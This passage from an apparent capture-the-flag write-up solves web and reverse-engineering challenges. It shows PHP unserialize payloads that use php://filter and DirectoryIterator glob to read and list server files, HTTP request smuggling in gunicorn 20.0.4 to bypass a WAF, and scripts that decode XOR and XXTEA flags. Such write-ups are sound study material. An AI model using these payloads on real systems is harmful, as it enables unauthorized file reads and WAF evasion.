variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">//O:1:"a":1:&#123;s:3:"un2";s:49:"php://filter/read=convert.base64-encode/resource=";&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522125410541.png" alt="image-20220522125410541"></p><p>解密读内容</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522125458491.png" alt="image-20220522125458491"></p><p>&lt;?php<br>$a = 'flag 在当前目录下以字母 f 开头的 txt 中，无法爆破出来 ';<br>想办法读当前目录，想到用原生类和</p><pre><code class="language-PHP">&lt;?php

class a&#123;
    public $un0=&quot;DirectoryIterator&quot;;//遍历指定目录下的所有文件的原生类，通过Givemeanew方法中的实例化
    public $un1=&quot;glob:///var/www/html/f*.txt&quot;;//查找匹配的文件路径模式匹配提示的文件
    public $un3=&quot;unserialize&quot;;
&#125;
$a=new a();
echo serialize($a);
//O:1:&quot;a&quot;:3:&#123;s:3:&quot;un0&quot;;s:17:&quot;DirectoryIterator&quot;;s:3:&quot;un1&quot;;s:27:&quot;glob:///var/www/html/f*.txt&quot;;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522130241623.png" alt="image-20220522130241623"></p><p>文件名越改越复杂，，，，，</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522130326809.png" alt="image-20220522130326809"></p><h4 id="让我康康"><a class="anchor" href="#让我康康">#</a> 让我康康！</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518223308258.png" alt="image-20220518223308258"></p><p>看源码有提示说 try flag，输入 flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518223400947.png" alt="image-20220518223400947"></p><p>提示说 flag 在 /fl4g 中，去访问这个文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220518223455599.png" alt="image-20220518223455599"></p><p>看来是有 waf 了，尝试了 url 编码绕过，目录穿越，垃圾数据溢出都不行，这里用 http 走私来绕 waf</p><p>在 gunicorn 20.0.4 版本中，存在一个请求走私漏洞，无论在 gunicorn 前使用哪个代理，该漏洞都有效。 Http 头中的</p><pre><code>Sec-Websocket-Key: 1
</code></pre><p>会进行特殊解析，从而引发此漏洞。</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522135511140.png" alt="image-20220522135511140"></p><p>来自本地</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522133628262.png" alt="image-20220522133628262"></p><p>在传入 flag 的 http 走私中拿到一个 ip 没见过，看来就是获取来源 ip 的了，加上这个字段</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522135725416.png" alt="image-20220522135725416"></p><h2 id="reverse"><a class="anchor" href="#reverse">#</a> REVERSE</h2><h4 id="getthetable"><a class="anchor" href="#getthetable">#</a> GetTheTable</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522182259706.png" alt="image-20220522182259706"></p><p>应该是有奇奇怪怪的编码</p><p>先用查壳工具检查</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522152531721.png" alt="image-20220522152531721"></p><p>无壳，64 位，拖到到 64 位 IDA，min 函数里有一字符串，不管那么多先尝试解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522153149092.png" alt="image-20220522153149092"></p><p>用解码工具解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522153230845.png" alt="image-20220522153230845"></p><p>得到 flag</p><h4 id="amys-code"><a class="anchor" href="#amys-code">#</a> Amy's Code</h4><p>还是先放到查壳工具</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522153628120.png" alt="image-20220522153628120"></p><p>无壳 32 位，拖到 IDA32 位查看</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522154006817.png" alt="image-20220522154006817"></p><p>在 main 函数看到有两个加密算法，sub_4115FF 点进去发现是个异或，关键函数是 sub_411433 函数，跟踪函数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522154255019.png" alt="image-20220522154255019"></p><p>这个地方也是一个简单的算法，那思路就简单了，逆运算一下就行，写一个脚本如下</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token keyword">char</span> v9<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">149</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">169</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">137</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">134</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">212</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">188</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">177</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">184</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">177</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">197</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">192</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">179</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">153</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">197</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">130</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">160</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">187</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">184</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"LWHFUENGDJGEFHYDHIGJ"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">//ISCC&#123;reverse_8b1Hc4&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522160819846.png" alt="image-20220522160819846"></p><h4 id="how_decode"><a class="anchor" href="#how_decode">#</a> How_decode</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522163025436.png" alt="image-20220522163025436"></p><p>64 位，放到 IDA 先找到 main 函数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522163133859.png" alt="image-20220522163133859"></p><p>发现就一个 encode 函数，跟踪查看</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522163551658.png" alt="image-20220522163551658"></p><p>这个还是比较眼熟的，可以判断是一个 XXTEA 加密，网上没找到好用的在线工具，发现个脚本可以直接跑</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token operator">*</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token class-name">size_t</span> len<span class="token punctuation">,</span><span class="token class-name">int32_t</span><span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">int</span> z<span class="token punctuation">,</span>y<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">/</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sum<span class="token operator">=</span>q <span class="token operator">*</span> DELTA<span class="token punctuation">,</span>e<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">return</span> data<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>sum<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>e<span class="token operator">=</span>sum<span class="token operator">>></span><span class="token number">2</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>n<span class="token punctuation">;</span>p<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>p<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>z<span class="token operator">=</span>data<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>y<span class="token operator">=</span>data<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>z<span class="token operator">=</span>data<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>y<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>sum<span class="token operator">-=</span>DELTA<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">return</span> data<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token class-name">int32_t</span> v<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">646664799</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1563984516</span><span class="token punctuation">,</span><span class="token number">5403868</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">851615406</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1577982033</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1112569621</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2038538024</span><span class="token punctuation">,</span><span class="token number">89732896</span><span class="token punctuation">,</span><span class="token number">856644365</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1143066723</span><span class="token punctuation">,</span><span class="token number">1826125009</span><span class="token punctuation">,</span><span class="token number">947398586</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">204891967</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1909151093</span><span class="token punctuation">,</span><span class="token number">632925486</span><span class="token punctuation">,</span><span class="token number">381866701</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">976384688</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1681924957</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token class-name">int32_t</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>n<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">18</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">// 解密：ISCC &#123;qiPc3F9vXgvn&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522182031536.png" alt="image-20220522182031536"></p><h4 id="sad-code"><a class="anchor" href="#sad-code">#</a> Sad Code</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522182224867.png" alt="image-20220522182224867"></p><p>喜欢做题，哪来呗</p><p>还是先查壳</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522183154672.png" alt="image-20220522183154672"></p><p>32 位没有壳</p><p>IDA32 打开发现有一个四元一次方程组，两个 if 条件句都满足时才会进入语句</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522183519315.png" alt="image-20220522183519315"></p><p>16 进制转为 10 进制后发现数太大，笔算太复杂，网上淘个可以在线计算的工具<span class="exturl" data-url="aHR0cHM6Ly93d3cuOTljYW5rYW8uY29tL2FsZ2VicmEvdW5rbnduNC5waHA=">四元一次方程组计算器 (99cankao.com)</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522211717399.png" alt="image-20220522211717399"></p><p>第一个方程组的解</p><pre><code>a[]=&#123;1230193475,2068859464,1296122456,1429031002&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522211424436.png" alt="image-20220522211424436"></p><p>第二个方程的解</p><pre><code>a[]=&#123;1313362508,1246113109,1464621131,1264076413&#125;
</code></pre><p>将结果转为 16 进制后转字符串</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522212736823.png" alt="image-20220522212736823"></p><h4 id="vigenerelike"><a class="anchor" href="#vigenerelike">#</a> VigenereLike</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523173216082.png" alt="image-20220523173216082"></p><p>64 位 ELF 文件用 ida 打开</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523173821236.png" alt="image-20220523173821236"></p><p>第一个关键函数是 sub_2914，跟踪审计是 7 次一次异或处理，第二个关键函数 sub_29C9 跟踪发现</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523174032865.png" alt="image-20220523174032865"></p><p>里面的 sub_27c6 进行 base64 编码 sub_2569 一个混淆加密</p><p>分析完了写个脚本跑一下就行</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">jiema</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    ch <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            ch<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    b <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    nums <span class="token operator">=</span> a<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">while</span> ch<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        temp_list <span class="token operator">=</span> ch<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            b <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        ch <span class="token operator">=</span> ch<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">return</span> b</pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>a <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>b <span class="token operator">=</span> <span class="token string">"rJFsLqVyFKZFEJvgerWvFpMkdmHBs5RX1ummCrv="</span></pre></td></tr><tr><td data-num="23"></td><td><pre>key <span class="token operator">=</span> <span class="token string">"ISCCYES"</span></pre></td></tr><tr><td data-num="24"></td><td><pre>v17 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token 